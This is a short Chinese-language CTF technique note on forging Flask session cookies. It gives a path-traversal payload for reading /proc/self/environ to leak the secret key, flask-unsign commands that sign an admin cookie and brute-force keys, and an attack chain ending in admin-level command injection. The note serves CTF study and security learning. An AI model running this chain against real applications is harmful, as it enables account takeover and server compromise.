---
title: "Flask-unsign Session 伪造" 
category: web
tags: [flask, session, forgery, secret-key, flask-unsign]
triggers: [flask-unsign, flask session, session forgery, secret_key leak, /proc/self/environ, proc self environ]
created: 2026-06-09
updated: 2026-06-09
sources: [raw/2025 ACTF Web 复现.md]
---

# Flask-unsign Session 伪造

## Summary

Flask 默认使用 cookie-based session，签名密钥为 `app.secret_key`。当能读取服务器环境变量或文件时，可获取 secret_key → 用 `flask-unsign` 工具伪造任意身份的 session cookie。

## 获取 secret_key 的常见途径

### 1. 通过任意文件读取 `/proc/self/environ`

```
?file_path=../../../../../../../../proc/self/environ
```

环境变量中若通过 `os.getenv('SECRET_KEY')` 设置，会直接出现在 `/proc/self/environ` 中。

### 2. 读取源码中的硬编码 key

某些代码中 `app.secret_key = 'hardcoded_string'`，通过任意文件读取源码即可获取。

## 伪造 Cookie

```bash
# 安装
pip install flask-unsign

# 签名伪造 cookie
flask-unsign --sign --secret S3cRetK3y --cookie '{"username": "admin"}'

# 输出伪造后的 session cookie
```

## Decode 已有 Cookie

```bash
flask-unsign --decode --cookie 'eyJ...'
flask-unsign --unsign --cookie 'eyJ...'  # 尝试爆破 secret key
```

## 漏洞利用组合

```
1. 任意文件读 → /proc/self/environ 或源码 → 获取 secret_key
2. flask-unsign 伪造 admin session
3. 利用 admin 权限执行命令注入或敏感操作
```

## Connections
- Related: [[web/flask-ssti-session-forgery]], [[web/ssrf-gopher-techniques]]
- Source: [[ctf/actf-2025]]
